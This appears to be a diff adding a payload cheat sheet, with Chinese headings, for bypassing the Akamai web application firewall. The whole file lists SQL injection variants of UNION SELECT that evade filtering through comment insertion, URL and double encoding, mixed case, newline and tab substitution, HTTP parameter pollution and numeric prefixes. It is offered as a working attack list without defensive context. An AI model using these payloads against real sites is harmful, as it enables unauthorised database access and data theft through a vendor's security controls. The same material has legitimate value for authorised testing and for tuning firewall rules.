@@ -1,0 +1,33 @@
+# Akamai WAF 绕过
+# 注释
+/**/UNION/**/SELECT
+/*!UNION*//*!SELECT*/
+/*%00*/UNION/*%00*/SELECT
+
+# 编码
+%55NION%20%53ELECT
+%2f%2a%2a%2fUNION
+
+# 大小写
+UnIoN SeLeCt
+UNION select
+
+# 换行
+UNION%0aSELECT
+UNION%0d%0aSELECT
+
+# 空格
+UNION%09SELECT
+UNION/**/SELECT
+
+# HPP
+id=1&id=UNION&id=SELECT
+
+# 双重编码
+%252f%252a%252a%252f
+%2527
+
+# 特殊
+UNION(SELECT)
+0UNION SELECT
+1.0UNION SELECT
